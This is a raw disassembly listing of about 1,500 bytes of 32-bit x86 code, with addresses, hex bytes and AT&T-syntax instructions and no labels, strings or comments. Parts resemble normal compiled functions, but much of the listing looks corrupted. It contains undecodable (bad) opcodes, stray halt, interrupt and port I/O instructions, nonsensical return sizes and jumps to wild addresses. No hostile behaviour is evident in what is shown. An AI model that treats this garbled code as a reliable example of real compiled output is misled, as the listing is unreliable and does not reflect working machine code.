  40ade4:	c7 00 69 00 00 00    	movl   $0x69,(%eax)
  40adea:	87 c0                	xchg   %eax,%eax
  40adec:	5d                   	pop    %ebp
  40aded:	05 53 56 54 75       	add    $0x75545653,%eax
  40adf2:	00 57 bf             	add    %dl,-0x41(%edi)
  40adf5:	41                   	inc    %ecx
  40adf6:	00 00                	add    %al,(%eax)
  40adf8:	00 8a 06 46 3c 63    	add    %cl,0x633c4606(%edx)
  40adfe:	88 d4                	mov    %dl,%ah
  40ae00:	10 3f                	adc    %bh,(%edi)
  40ae02:	1a 0d 45 10 bb 64    	sbb    0x64bb1045,%cl
  40ae08:	00 00                	add    %al,(%eax)
  40ae0a:	00 25 ff 1d b7 00    	add    %ah,0xb71dff
  40ae10:	99                   	cltd
  40ae11:	f7 91 04 30 88 55    	notl   0x55883004(%ecx)
  40ae17:	10 88 01 6c eb 04    	adc    %cl,0x4eb6c01(%eax)
  40ae1d:	26 09 76 8b          	or     %esi,%es:-0x75(%esi)
  40ae21:	8b 45 10             	mov    0x10(%ebp),%eax
  40ae24:	bb 0a 8e b6 00       	mov    $0xb68e0a,%ebx
  40ae29:	25 ff 00 00 00       	and    $0xff,%eax
  40ae2e:	50                   	push   %eax
  40ae2f:	f7 01 04 a8 cf 34    	testl  $0x34cfa804,(%ecx)
  40ae35:	41                   	inc    %ecx
  40ae36:	8a c2                	mov    %dl,%al
  40ae38:	af                   	scas   %es:(%edi),%eax
  40ae39:	18 88 01 41 c6 01    	sbb    %cl,0x1c64101(%eax)
  40ae3f:	39 41 4f             	cmp    %eax,0x4f(%ecx)
  40ae42:	75 b4                	jne    0x40adf8
  40ae44:	33 45 0c             	xor    0xc(%ebp),%eax
  40ae47:	5f                   	pop    %edi
  40ae48:	5e                   	pop    %esi
  40ae49:	12 41 1c             	adc    0x1c(%ecx),%al
  40ae4c:	03 5b ac             	add    -0x54(%ebx),%ebx
  40ae4f:	c3                   	ret
  40ae50:	bb 8b ec 83 11       	mov    $0x1183ec8b,%ebx
  40ae55:	66 53                	push   %bx
  40ae57:	f6 8b eb 10 57 83 3e 	testb  $0x3e,-0x7ca8ef15(%ebx)
  40ae5e:	00 77 11             	add    %dh,0x11(%edi)
  40ae61:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40ae67:	5f                   	pop    %edi
  40ae68:	5e                   	pop    %esi
  40ae69:	33 c0                	xor    %eax,%eax
  40ae6b:	5b                   	pop    %ebx
  40ae6c:	8b e5                	mov    %ebp,%esp
  40ae6e:	5d                   	pop    %ebp
  40ae6f:	c2 0c 00             	ret    $0xc
  40ae72:	ac                   	lods   %ds:(%esi),%al
  40ae73:	5d                   	pop    %ebp
  40ae74:	08 8b 43 1a f6 c4    	or     %cl,-0x3b09e5bd(%ebx)
  40ae7a:	02 74 65 73          	add    0x73(%ebp,%eiz,2),%dh
  40ae7e:	43                   	inc    %ebx
  40ae7f:	0c 85                	or     $0x85,%al
  40ae81:	c0 cd 32             	ror    $0x32,%ch
  40ae84:	8b 03                	mov    (%ebx),%eax
  40ae86:	6a 14                	push   $0x14
  40ae88:	93                   	xchg   %eax,%ebx
  40ae89:	33 ff                	xor    %edi,%edi
  40ae8b:	e8 d0 9b ff ff       	call   0x404a60
  40ae90:	8b c8                	mov    %eax,%ecx
  40ae92:	89 93 89 6a 04 dd    	mov    %edx,-0x22fb9577(%ebx)
  40ae98:	78 08                	js     0x40aea2
  40ae9a:	84 78 0c             	test   %bh,0xc(%eax)
  40ae9d:	57                   	push   %edi
  40ae9e:	ce                   	into
  40ae9f:	57                   	push   %edi
  40aea0:	89 78 10             	mov    %edi,0x10(%eax)
  40aea3:	eb 89                	jmp    0x40ae2e
  40aea5:	4b                   	dec    %ebx
  40aea6:	0c ff                	or     $0xff,%al
  40aea8:	15 a0 c0 40 00       	adc    $0x40c0a0,%eax
  40aead:	8b 53 0c             	mov    0xc(%ebx),%edx
  40aeb0:	89 42 10             	mov    %eax,0x10(%edx)
  40aeb3:	8b 43 0c             	mov    0xc(%ebx),%eax
  40aeb6:	8b 48 10             	mov    0x10(%eax),%ecx
  40aeb9:	85 c9                	test   %ecx,%ecx
  40aebb:	75 25                	jne    0x40aee2
  40aebd:	f6 5e 98             	negb   -0x68(%esi)
  40aec0:	c0 40 00 ff          	rolb   $0xff,0x0(%eax)
  40aec4:	d6                   	salc
  40aec5:	85 c0                	test   %eax,%eax
  40aec7:	75 09                	jne    0x40aed2
  40aec9:	5f                   	pop    %edi
  40aeca:	5e                   	pop    %esi
  40aecb:	5b                   	pop    %ebx
  40aecc:	8b e5                	mov    %ebp,%esp
  40aece:	5d                   	pop    %ebp
  40aecf:	c2 71 00             	ret    $0x71
  40aed2:	99                   	cltd
  40aed3:	ba 51 5e 05 80       	mov    $0x80055e51,%edx
  40aed8:	00 0a                	add    %cl,(%edx)
  40aeda:	00 54 8b e5          	add    %dl,-0x1b(%ebx,%ecx,4)
  40aede:	5d                   	pop    %ebp
  40aedf:	c2 0c 00             	ret    $0xc
  40aee2:	8b 43 30             	mov    0x30(%ebx),%eax
  40aee5:	bd cf 80 3b 7f       	mov    $0x7f3b80cf,%ebp
  40aeea:	8b 45 0c             	mov    0xc(%ebp),%eax
  40aeed:	74 28                	je     0x40af17
  40aeef:	29 4b 63             	sub    %ecx,0x63(%ebx)
  40aef2:	88 08                	mov    %cl,(%eax)
  40aef4:	8b 16                	mov    (%esi),%edx
  40aef6:	40                   	inc    %eax
  40aef7:	4a                   	dec    %edx
  40aef8:	89 16                	mov    %edx,(%esi)
  40aefa:	89 16                	mov    %edx,(%esi)
  40aefc:	30 8b 0e 89 45 0c    	xor    %cl,0xc45890e(%ebx)
  40af02:	85 c9                	test   %ecx,%ecx
  40af04:	af                   	scas   %es:(%edi),%eax
  40af05:	11 c7                	adc    %eax,%edi
  40af07:	06                   	push   %es
  40af08:	01 00                	add    %eax,(%eax)
  40af0a:	00 86 5f 5e 73 c0    	add    %al,-0x3f8ca1a1(%esi)
  40af10:	db 8b e5 5d c2 0c    	fisttpl 0xcc25de5(%ebx)
  40af16:	00 8a 4b 2c 38 c9    	add    %cl,-0x36c7d3b5(%edx)
  40af1c:	0f 84 1d 01 00 00    	je     0x40b03f
  40af22:	82 53 58 8b          	adcb   $0x8b,0x58(%ebx)
  40af26:	3e 9e                	ds sahf
  40af28:	89 61 fc             	mov    %esp,-0x4(%ecx)
  40af2b:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40af2e:	79 9d                	jns    0x40aecd
  40af30:	f3 ff 45 83          	repz incl -0x7d(%ebp)
  40af34:	7b 48                	jnp    0x40af7e
  40af36:	01 75 2d             	add    %esi,0x2d(%ebp)
  40af39:	53                   	push   %ebx
  40af3a:	e8 91 03 00 00       	call   0x40b2d0
  40af3f:	33 c9                	xor    %ecx,%ecx
  40af41:	89 45 bf             	mov    %eax,-0x41(%ebp)
  40af44:	3b a6 d5 15 8b 43    	cmp    0x438b15d5(%esi),%esp
  40af4a:	7a 50                	jp     0x40af9c
  40af4c:	e8 7b e4 ff a2       	call   0xa34093cc
  40af51:	8b 45 08             	mov    0x8(%ebp),%eax
  40af54:	5f                   	pop    %edi
  40af55:	5e                   	pop    %esi
  40af56:	9f                   	lahf
  40af57:	8b e5                	mov    %ebp,%esp
  40af59:	5d                   	pop    %ebp
  40af5a:	c2 0c 00             	ret    $0xc
  40af5d:	89 4b 3c             	mov    %ecx,0x3c(%ebx)
  40af60:	89 4b 48             	mov    %ecx,0x48(%ebx)
  40af63:	89 ba 44 c7 71 08    	mov    %edi,0x871c744(%edx)
  40af69:	70 00                	jo     0x40af6b
  40af6b:	00 00                	add    %al,(%eax)
  40af6d:	eb 03                	jmp    0x40af72
  40af6f:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40af72:	34 ff                	xor    $0xff,%al
  40af74:	0f 86 82 f6 00 e2    	jbe    0xe241a5fc
  40af7a:	8b 4b 95             	mov    -0x6b(%ebx),%ecx
  40af7d:	8b 43 44             	mov    0x44(%ebx),%eax
  40af80:	3b 59 72             	cmp    0x72(%ecx),%ebx
  40af83:	e5 8b                	in     $0x8b,%eax
  40af85:	48                   	dec    %eax
  40af86:	9a 8b 4b 38 8d 55 f4 	lcall  $0xf455,$0x8d384b8b
  40af8d:	52                   	push   %edx
  40af8e:	50                   	push   %eax
  40af8f:	51                   	push   %ecx
  40af90:	74 e8                	je     0x40af7a
  40af92:	c7 00 00 00 8b d7    	movl   $0xd78b0000,(%eax)
  40af98:	f4                   	hlt
  40af99:	0b d2                	or     %edx,%edx
  40af9b:	d5 8c                	aad    $0x8c
  40af9d:	10 3b                	adc    %bh,(%ebx)
  40af9f:	ca 89 42             	lret   $0x4289
  40afa2:	f4                   	hlt
  40afa3:	74 64                	je     0x40b009
  40afa5:	8b 73 50             	mov    0x50(%ebx),%esi
  40afa8:	8b 43 54             	mov    0x54(%ebx),%eax
  40afab:	03 f1                	add    %ecx,%esi
  40afad:	89 4b 44             	mov    %ecx,0x44(%ebx)
  40afb0:	13 c2                	adc    %edx,%eax
  40afb2:	89 73 50             	mov    %esi,0x50(%ebx)
  40afb5:	89 43 54             	mov    %eax,0x54(%ebx)
  40afb8:	89 6d 3c             	mov    %ebp,0x3c(%ebp)
  40afbb:	8b 5c 4b c0          	mov    -0x40(%ebx,%ecx,2),%ebx
  40afbf:	43                   	inc    %ebx
  40afc0:	b2 2b                	mov    $0x2b,%dl
  40afc2:	c2 3b f8             	ret    $0xf83b
  40afc5:	77 02                	ja     0x40afc9
  40afc7:	8b c7                	mov    %edi,%eax
  40afc9:	6f                   	outsl  %ds:(%esi),(%dx)
  40afca:	73 33                	jae    0x40afff
  40afcc:	8b f2                	mov    %edx,%esi
  40afce:	fc                   	cld
  40afcf:	8b c8                	mov    %eax,%ecx
  40afd1:	03 f2                	add    %edx,%esi
  40afd3:	8b d1                	mov    %ecx,%edx
  40afd5:	c1 9e 02 f3 5a 8b ca 	rcrl   $0xca,-0x74a50cfe(%esi)
  40afdc:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40afdf:	83 e1 03             	and    $0x3,%ecx
  40afe2:	f5                   	cmc
  40afe3:	d0 f3                	shl    $1,%bl
  40afe5:	39 8b 2d 3c 8b 4d    	cmp    %ecx,0x4d8b3c2d(%ebx)
  40afeb:	f8                   	clc
  40afec:	03 f0                	add    %eax,%esi
  40afee:	2b c8                	sub    %eax,%ecx
  40aff0:	8b 45 08             	mov    0x8(%ebp),%eax
  40aff3:	89 73 3c             	mov    %esi,0x3c(%ebx)
  40aff6:	de 75 10             	fidivs 0x10(%ebp)
  40aff9:	f8                   	clc
  40affa:	55                   	push   %ebp
  40affb:	fc                   	cld
  40affc:	56                   	push   %esi
  40affd:	fc                   	cld
  40affe:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40b001:	0f 84 68 ff 1b ff    	je     0xff5caf6f
  40b007:	eb 0e                	jmp    0x40b017
  40b009:	9c                   	pushf
  40b00a:	7e 11                	jle    0x40b01d
  40b00c:	7c 00                	jl     0x40b00e
  40b00e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b00f:	07                   	pop    %es
  40b010:	c7                   	(bad)
  40b011:	75 28                	jne    0x40b03b
  40b013:	01 4f 00             	add    %ecx,0x0(%edi)
  40b016:	00 8b 45 fc 8b 4d    	add    %cl,0x4d8bfc45(%ebx)
  40b01c:	0c 2b                	or     $0x2b,%al
  40b01e:	c1 89 06 74 07 c7 45 	rorl   $0x45,-0x38f88bfa(%ecx)
  40b025:	57                   	push   %edi
  40b026:	00 00                	add    %al,(%eax)
  40b028:	00 00                	add    %al,(%eax)
  40b02a:	ec                   	in     (%dx),%al
  40b02b:	43                   	inc    %ebx
  40b02c:	58                   	pop    %eax
  40b02d:	94                   	xchg   %eax,%esp
  40b02e:	e8 0d f3 ff ff       	call   0x40a340
  40b033:	e5 88                	in     $0x88,%eax
  40b035:	ab                   	stos   %eax,%es:(%edi)
  40b036:	8f                   	(bad)
  40b037:	f5                   	cmc
  40b038:	5b                   	pop    %ebx
  40b039:	8b e5                	mov    %ebp,%esp
  40b03b:	0a c2                	or     %dl,%al
  40b03d:	0c 00                	or     $0x0,%al
  40b03f:	8b 16                	mov    (%esi),%edx
  40b041:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40b044:	9c                   	pushf
  40b045:	98                   	cwtl
  40b046:	28 53 e8             	sub    %dl,-0x18(%ebx)
  40b049:	33 00                	xor    (%eax),%eax
  40b04b:	00 a8 83 c4 10 3d    	add    %ch,0x3d10c483(%eax)
  40b051:	06                   	push   %es
  40b052:	69 01 00 89 45 08    	imul   $0x8458900,(%ecx),%eax
  40b058:	75 07                	jne    0x40b061
  40b05a:	c7 43 28 01 00 00 00 	movl   $0x1,0x28(%ebx)
  40b061:	8b 45 de             	mov    -0x22(%ebp),%eax
  40b064:	5f                   	pop    %edi
  40b065:	89 06                	mov    %eax,(%esi)
  40b067:	8b 45 08             	mov    0x8(%ebp),%eax
  40b06a:	5e                   	pop    %esi
  40b06b:	5b                   	pop    %ebx
  40b06c:	18 e5                	sbb    %ah,%ch
  40b06e:	5d                   	pop    %ebp
  40b06f:	1a 0c 00             	sbb    (%eax,%eax,1),%cl
  40b072:	90                   	nop
  40b073:	90                   	nop
  40b074:	e5 59                	in     $0x59,%eax
  40b076:	90                   	nop
  40b077:	b2 20                	mov    $0x20,%dl
  40b079:	78 4b                	js     0x40b0c6
  40b07b:	90                   	nop
  40b07c:	90                   	nop
  40b07d:	90                   	nop
  40b07e:	90                   	nop
  40b07f:	90                   	nop
  40b080:	55                   	push   %ebp
  40b081:	8b ec                	mov    %esp,%ebp
  40b083:	56                   	push   %esi
  40b084:	8b eb                	mov    %ebx,%ebp
  40b086:	08 57 09             	or     %dl,0x9(%edi)
  40b089:	7d 10                	jge    0x40b09b
  40b08b:	8b 46 10             	mov    0x10(%esi),%eax
  40b08e:	8b 4e 14             	mov    0x14(%esi),%ecx
  40b091:	6c                   	insb   (%dx),%es:(%edi)
  40b092:	c1 c7 45             	rol    $0x45,%edi
  40b095:	10 00                	adc    %al,(%eax)
  40b097:	00 4b 4e             	add    %cl,0x4e(%ebx)
  40b09a:	75 71                	jne    0x40b10d
  40b09c:	8a 46 08             	mov    0x8(%esi),%al
  40b09f:	ab                   	stos   %eax,%es:(%edi)
  40b0a0:	c0 b5 6a 8b 56 04 8d 	shlb   $0x8d,0x4568b6a(%ebp)
  40b0a7:	4d                   	dec    %ebp
  40b0a8:	08 6a 00             	or     %ch,0x0(%edx)
  40b0ab:	51                   	push   %ecx
  40b0ac:	6a 3e                	push   $0x3e
  40b0ae:	6a 00                	push   $0x0
  40b0b0:	6a 00                	push   $0x0
  40b0b2:	52                   	push   %edx
  40b0b3:	27                   	daa
  40b0b4:	e6 0c                	out    %al,$0xc
  40b0b6:	c0 40 00 85          	rolb   $0x85,0x0(%eax)
  40b0ba:	c0 75 35 8b          	shlb   $0x8b,0x35(%ebp)
  40b0be:	35 98 c0 e2 03       	xor    $0x3e2c098,%eax
  40b0c3:	ff d6                	call   *%esi
  40b0c5:	85 c0                	test   %eax,%eax
  40b0c7:	14 09                	adc    $0x9,%al
  40b0c9:	8b 4d 99             	mov    -0x67(%ebp),%ecx
  40b0cc:	5f                   	pop    %edi
  40b0cd:	5e                   	pop    %esi
  40b0ce:	89 01                	mov    %eax,(%ecx)
  40b0d0:	5d                   	pop    %ebp
  40b0d1:	3c ff                	cmp    $0xff,%al
  40b0d3:	d6                   	salc
  40b0d4:	05 80 fc 0a 00       	add    $0xafc80,%eax
  40b0d9:	3d ed fc 14 00       	cmp    $0x14fced,%eax
  40b0de:	21 05 b8 7e 11 01    	and    %eax,0x1117eb8
  40b0e4:	00 8b 4d 14 d5 76    	add    %cl,0x76d5144d(%ebx)
  40b0ea:	83 01 00             	addl   $0x0,(%ecx)
  40b0ed:	88 38                	mov    %bh,(%eax)
  40b0ef:	00 5d c3             	add    %bl,-0x3d(%ebp)
  40b0f2:	9b                   	fwait
  40b0f3:	45                   	inc    %ebp
  40b0f4:	08 85 c0 75 4d 8b    	or     %al,-0x74b28a40(%ebp)
  40b0fa:	55                   	push   %ebp
  40b0fb:	14 5f                	adc    $0x5f,%al
  40b0fd:	5e                   	pop    %esi
  40b0fe:	89 02                	mov    %eax,(%edx)
  40b100:	b8 0b 00 00 00       	mov    $0xb,%eax
  40b105:	95                   	xchg   %eax,%ebp
  40b106:	c3                   	ret
  40b107:	3b f8                	cmp    %eax,%edi
  40b109:	76 02                	jbe    0x40b10d
  40b10b:	8b 92 8b 46 0c 85    	mov    -0x7af3b975(%edx),%edx
  40b111:	c5 6a 13             	lds    0x13(%edx),%ebp
  40b114:	8a 2a                	mov    (%edx),%ch
  40b116:	08 84 c9 75 1c 8b 56 	or     %al,0x568b1c75(%ecx,%ecx,8)
  40b11d:	50                   	push   %eax
  40b11e:	89 48 08             	mov    %ecx,0x8(%eax)
  40b121:	8b 46 50             	mov    0x50(%esi),%eax
  40b124:	8b 56 54             	mov    0x54(%esi),%edx
  40b127:	b9 20 00 00 92       	mov    $0x92000020,%ecx
  40b12c:	e8 df 06 00 00       	call   0x40b810
  40b131:	8b 56 0c             	mov    0xc(%esi),%edx
  40b134:	89 c6                	mov    %eax,%esi
  40b136:	0c 8b                	or     $0x8b,%al
  40b138:	46                   	inc    %esi
  40b139:	0c 8b                	or     $0x8b,%al
  40b13b:	55                   	push   %ebp
  40b13c:	0c 53                	or     $0x53,%al
  40b13e:	8d 4d ca             	lea    -0x36(%ebp),%ecx
  40b141:	50                   	push   %eax
  40b142:	8b 46 04             	mov    0x4(%esi),%eax
  40b145:	51                   	push   %ecx
  40b146:	57                   	push   %edi
  40b147:	52                   	push   %edx
  40b148:	50                   	push   %eax
  40b149:	1b 15 10 c0 40 00    	sbb    0x40c010,%edx
  40b14f:	85 c0                	test   %eax,%eax
  40b151:	74 07                	je     0x40b15a
  40b153:	33 49 e9             	xor    -0x17(%ecx),%ecx
  40b156:	2b 01                	sub    (%ecx),%eax
  40b158:	00 00                	add    %al,(%eax)
  40b15a:	8b 3d 98 28 40 b4    	mov    0xb4402898,%edi
  40b160:	9a d7 85 c0 0f 84 1b 	lcall  $0x1b84,$0xfc085d7
  40b167:	01 00                	add    %eax,(%eax)
  40b169:	b3 1f                	mov    $0x1f,%bl
  40b16b:	d7                   	xlat   %ds:(%ebx)
  40b16c:	81 cd fc 0a 00 3d    	or     $0x3d000afc,%ebp
  40b172:	78 00                	js     0x40b174
  40b174:	0b 00                	or     (%eax),%eax
  40b176:	0f 85 70 00 4a 00    	jne    0x8ab1ec
  40b17c:	d0 1d 9c a2 40 00    	rcrb   $1,0x40a29c
  40b182:	8b 4e 14             	mov    0x14(%esi),%ecx
  40b185:	8b 5e 10             	mov    0x10(%esi),%ebx
  40b188:	15 e1 7c 16 7f       	adc    $0x7f167ce1,%eax
  40b18d:	04 85                	add    $0x85,%al
  40b18f:	c0 76 8d 6a          	shlb   $0x6a,-0x73(%esi)
  40b193:	00 68 e8             	add    %ch,-0x18(%eax)
  40b196:	03 94 00 51 50 e8 f0 	add    -0xf17afaf(%eax,%eax,1),%edx
  40b19d:	b5 00                	mov    $0x0,%ch
  40b19f:	89 eb                	mov    %ebp,%ebx
  40b1a1:	0d 23 c1 83 f8       	or     $0xf883c123,%eax
  40b1a6:	ff 46 04             	incl   0x4(%esi)
  40b1a9:	0b c0                	or     %eax,%eax
  40b1ab:	eb 02                	jmp    0x40b1af
  40b1ad:	33 c0                	xor    %eax,%eax
  40b1af:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40b1b2:	bb 8b 51 10 52       	mov    $0x5210518b,%ebx
  40b1b7:	ff d3                	call   *%ebx
  40b1b9:	8b 56 81             	mov    -0x7f(%esi),%edx
  40b1bc:	ff 80 00 17 8c 74    	incl   0x748c1700(%eax)
  40b1c2:	bf 85 ff 8a 31       	mov    $0x318aff85,%edi
  40b1c7:	e5 60                	in     $0x60,%eax
  40b1c9:	9b                   	fwait
  40b1ca:	41                   	inc    %ecx
  40b1cb:	d8 8b 5e 04 85 c0    	fmuls  -0x3f7afba2(%ebx)
  40b1d1:	75 18                	jne    0x40b1eb
  40b1d3:	50                   	push   %eax
  40b1d4:	68 ec 00 41 00       	push   $0x4100ec
  40b1d9:	50                   	push   %eax
  40b1da:	5b                   	pop    %ebx
  40b1db:	61                   	popa
  40b1dc:	f7 ff                	idiv   %edi
  40b1de:	09 83 c4 0c a3 19    	or     %eax,0x19a30cc4(%ebx)
  40b1e4:	09 41 00             	or     %eax,0x0(%ecx)
  40b1e7:	85 c0                	test   %eax,%eax
  40b1e9:	79 05                	jns    0x40b1f0
  40b1eb:	53                   	push   %ebx
  40b1ec:	ff                   	ljmp   (bad)
  40b1ed:	ec                   	in     (%dx),%al
  40b1ee:	eb 98                	jmp    0x40b188
  40b1f0:	6a 01                	push   $0x1
  40b1f2:	ff 15 4c c0 40 00    	call   *0x40c04c
  40b1f8:	8b 4e 86             	mov    -0x7a(%esi),%ecx
  40b1fb:	8b 56 04             	mov    0x4(%esi),%edx
  40b1fe:	8d                   	lea    (bad),%eax
  40b1ff:	c3                   	ret
  40b200:	10 df                	adc    %bl,%bh
  40b202:	01 50 51             	add    %edx,0x51(%eax)
  40b205:	18 86 15 b4 c0 40    	sbb    %al,0x40c0b415(%esi)
  40b20b:	00 85 c0 74 04 33    	add    %al,0x330474c0(%ebp)
  40b211:	c0 2a 71             	shrb   $0x71,(%edx)
  40b214:	07                   	pop    %es
  40b215:	1d 98 c0 40 00       	sbb    $0x40c098,%eax
  40b21a:	ff d3                	call   *%ebx
  40b21c:	85 c0                	test   %eax,%eax
  40b21e:	74 65                	je     0x40b285
  40b220:	ff d3                	call   *%ebx
  40b222:	05 80 fc 0a 00       	add    $0xafc80,%eax
  40b227:	3d d2 00 0b 00       	cmp    $0xb00d2,%eax
  40b22c:	74 07                	je     0x40b235
  40b22e:	c7                   	(bad)
  40b22f:	0e                   	push   %cs
  40b230:	00 0b                	add    %cl,(%ebx)
  40b232:	d2 75 1a             	shlb   %cl,0x1a(%ebp)
  40b235:	ea ff 02 01 00 00 75 	ljmp   $0x7500,$0x102ff
  40b23c:	12 8b 4d 4b d7 55    	adc    0x55d74b4d(%ebx),%cl
  40b242:	10 5b 5f             	adc    %bl,0x5f(%ebx)
  40b245:	5f                   	pop    %edi
  40b246:	77 11                	ja     0x40b259
  40b248:	97                   	xchg   %eax,%edi
  40b249:	00 89 11 5e 12 c3    	add    %cl,-0x3ceda1ef(%ecx)
  40b24f:	de ed                	fsubrp %st,%st(5)
  40b251:	fc                   	cld
  40b252:	0a 00                	or     (%eax),%al
  40b254:	75 12                	jne    0x40b268
  40b256:	cb                   	lret
  40b257:	33 66 3c             	xor    0x3c(%esi),%esp
  40b25a:	55                   	push   %ebp
  40b25b:	10 5b 5f             	adc    %bl,0x5f(%ebx)
  40b25e:	b8 7e c6 01 00       	mov    $0x1c67e,%eax
  40b263:	8c 9e 5e 5d c3 3d    	mov    %ds,0x3dc35d5e(%esi)
  40b269:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b26a:	fc                   	cld
  40b26b:	0a 00                	or     (%eax),%al
  40b26d:	75 12                	jne    0x40b281
  40b26f:	8b 5c 14 8b          	mov    -0x75(%esp,%edx,1),%ebx
  40b273:	55                   	push   %ebp
  40b274:	10 5b 5f             	adc    %bl,0x5f(%ebx)
  40b277:	41                   	inc    %ecx
  40b278:	7e 11                	jle    0x40b28b
  40b27a:	01 00                	add    %eax,(%eax)
  40b27c:	89 11                	mov    %edx,(%ecx)
  40b27e:	60                   	pusha
  40b27f:	49                   	dec    %ecx
  40b280:	c3                   	ret
  40b281:	85 87 fc 38 8b 4d    	test   %eax,0x4d8b38fc(%edi)
  40b287:	10 85 c9 75 12 8b    	adc    %al,-0x74ed8a37(%ebp)
  40b28d:	4d                   	dec    %ebp
  40b28e:	14 8b                	adc    $0x8b,%al
  40b290:	55                   	push   %ebp
  40b291:	10 5b 5f             	adc    %bl,0x5f(%ebx)
  40b294:	b8 7e 11 01 00       	mov    $0x1117e,%eax
  40b299:	89 b1 5e 5d c3 8b    	mov    %esi,-0x743ca2a2(%ecx)
  40b29f:	56                   	push   %esi
  40b2a0:	0c f0                	or     $0xf0,%al
  40b2a2:	d2 74 18 8a          	shlb   %cl,-0x76(%eax,%ebx,1)
  40b2a6:	56                   	push   %esi
  40b2a7:	08 84 d2 dc 11 8b 9f 	or     %al,-0x6074ee24(%edx,%edx,8)
  40b2ae:	50                   	push   %eax
  40b2af:	03 f3                	add    %ebx,%esi
  40b2b1:	8b 4e 54             	mov    0x54(%esi),%ecx
  40b2b4:	83 d1 00             	adc    $0x0,%ecx
  40b2b7:	12 56 50             	adc    0x50(%esi),%dl
  40b2ba:	89 4e 54             	mov    %ecx,0x54(%esi)
  40b2bd:	8b b8 14 1a fa 10    	mov    0x10fa1a14(%eax),%edi
  40b2c3:	5b                   	pop    %ebx
  40b2c4:	2e ac                	lods   %cs:(%esi),%al
  40b2c6:	11 5e 5d             	adc    %ebx,0x5d(%esi)
  40b2c9:	c3                   	ret
  40b2ca:	90                   	nop
  40b2cb:	58                   	pop    %eax
  40b2cc:	90                   	nop
  40b2cd:	90                   	nop
  40b2ce:	90                   	nop
  40b2cf:	90                   	nop
  40b2d0:	55                   	push   %ebp
  40b2d1:	38 ec                	cmp    %ch,%ah
  40b2d3:	f4                   	hlt
  40b2d4:	56                   	push   %esi
  40b2d5:	ce                   	into
  40b2d6:	e3 08                	jecxz  0x40b2e0
  40b2d8:	7e 4e                	jle    0x40b328
  40b2da:	2c 84                	sub    $0x84,%al
  40b2dc:	c0 0f 84             	rorb   $0x84,(%edi)
  40b2df:	be 00 00 00 8b       	mov    $0x8b000000,%esi
  40b2e4:	4e                   	dec    %esi
  40b2e5:	48                   	dec    %eax
  40b2e6:	33 55 53             	xor    0x53(%ebp),%edx
  40b2e9:	27                   	daa
  40b2ea:	f9                   	stc
  40b2eb:	01 57 89             	add    %edx,-0x77(%edi)
  40b2ee:	45                   	inc    %ebp
  40b2ef:	fc                   	cld
  40b2f0:	72 77                	jb     0x40b369
  40b2f2:	08 0f                	or     %cl,(%edi)
  40b2f4:	4f                   	dec    %edi
  40b2f5:	e1 00                	loope  0x40b2f7
  40b2f7:	00 00                	add    %al,(%eax)
  40b2f9:	f9                   	stc
  40b2fa:	7e 3c                	jle    0x40b338
  40b2fc:	3b f8                	cmp    %eax,%edi
  40b2fe:	0f 84 91 00 00 00    	je     0x40b395
  40b304:	8b 5e 38             	mov    0x38(%esi),%ebx
  40b307:	83 ff ff             	cmp    $0xffffffff,%edi
  40b30a:	9a 05 83 c8 ff eb 02 	lcall  $0x2eb,$0xffc88305
  40b311:	8b 93 8b 60 04 f9    	mov    -0x6fb9f75(%ebx),%edx
  40b317:	51                   	push   %ecx
  40b318:	fc                   	cld
  40b319:	2a 00                	sub    (%eax),%al
  40b31b:	51                   	push   %ecx
  40b31c:	50                   	push   %eax
  40b31d:	74 7e                	je     0x40b39d
  40b31f:	ff 15 14 c0 40 00    	call   *0x40c014
  40b325:	85 68 74             	test   %ebp,0x74(%eax)
  40b328:	2f                   	das
  40b329:	77 e1                	ja     0x40b30c
  40b32b:	fc                   	cld
  40b32c:	bc 56 50 8b b4       	mov    $0xb48b5056,%esp
  40b331:	b4 03                	mov    $0x3,%ah
  40b333:	87 ed                	xchg   %ebp,%ebp
  40b335:	d1 00                	roll   $1,(%eax)
  40b337:	2b 39                	sub    (%ecx),%edi
  40b339:	03 d8                	add    %eax,%ebx
  40b33b:	37                   	aaa
  40b33c:	56                   	push   %esi
  40b33d:	f9                   	stc
  40b33e:	85 7d 89             	test   %edi,-0x77(%ebp)
  40b341:	0f 54 77 c2          	andps  -0x3e(%edi),%xmm6
  40b345:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40b348:	ca c7 46             	lret   $0x46c7
  40b34b:	3c 00                	cmp    $0x0,%al
  40b34d:	00 00                	add    %al,(%eax)
  40b34f:	fb                   	sti
  40b350:	5b                   	pop    %ebx
  40b351:	c6                   	(bad)
  40b352:	b5 e5                	mov    $0xe5,%ch
  40b354:	2a c2                	sub    %dl,%al
  40b356:	04 00                	add    $0x0,%al
  40b358:	8b 3d 98 9f 40 00    	mov    0x409f98,%edi
  40b35e:	ff d7                	call   *%edi
  40b360:	85 c0                	test   %eax,%eax
  40b362:	75 05                	jne    0x40b369
  40b364:	89 45 08             	mov    %eax,0x8(%ebp)
  40b367:	eb e6                	jmp    0x40b34f
  40b369:	ff d7                	call   *%edi
  40b36b:	05 80 fc 0a 00       	add    $0xafc80,%eax
  40b370:	89 fb                	mov    %edi,%ebx
  40b372:	08 8b 45 fc 8b 56    	or     %cl,0x568bfc45(%ebx)
  40b378:	50                   	push   %eax
  40b379:	8b 4e ce             	mov    -0x32(%esi),%ecx
  40b37c:	03 d0                	add    %eax,%edx
  40b37e:	f6 45 08 7e          	testb  $0x7e,0x8(%ebp)
  40b382:	56                   	push   %esi
  40b383:	50                   	push   %eax
  40b384:	83 d1 04             	adc    $0x4,%ecx
  40b387:	85 ca                	test   %ecx,%edx
  40b389:	89 4e 2a             	mov    %ecx,0x2a(%esi)
  40b38c:	9a 07 c7 46 3c 00 18 	lcall  $0x1800,$0x3c46c707
  40b393:	00 00                	add    %al,(%eax)
  40b395:	8b 45 08             	mov    0x8(%ebp),%eax
  40b398:	5f                   	pop    %edi
  40b399:	5b                   	pop    %ebx
  40b39a:	c0 8b e5 5d c2 04 00 	rorb   $0x0,0x4c25de5(%ebx)
  40b3a1:	33 0b                	xor    (%ebx),%ecx
  40b3a3:	5e                   	pop    %esi
